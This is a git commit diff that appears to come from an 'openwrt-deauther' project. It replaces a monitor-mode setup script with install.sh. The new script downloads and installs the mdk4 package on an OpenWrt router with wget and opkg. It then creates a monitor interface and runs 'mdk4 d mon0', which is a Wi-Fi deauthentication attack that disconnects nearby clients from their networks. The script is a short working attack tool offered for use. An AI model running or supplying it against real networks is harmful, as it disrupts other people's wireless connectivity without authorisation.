2230a8b14717b955c00a3970ba93a1580273591a
xiv3r <117867334+xiv3r@users.noreply.github.com>
2024-11-05 10:27:45 +0800

    Update and rename monitor_mode.sh to install.sh

---
+++ install.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+
+opkg update
+wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk
+opkg install mdk4.ipk
+
+echo "
+iw phy phy0 interface add mon0 type monitor
+sleep 1s
+echo 'monitor mode mon0 enable'
+ip link set mon0 up
+mdk4 d mon0
+" > mon.sh
+chmod +x mon.sh
+sh mon.sh
+
--- monitor_mode.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/sh
-echo 'mon0 monitor mode enable'
-iw phy phy0 interface add mon0 type monitor
-ip link set mon0 up
-airodump-ng mon0
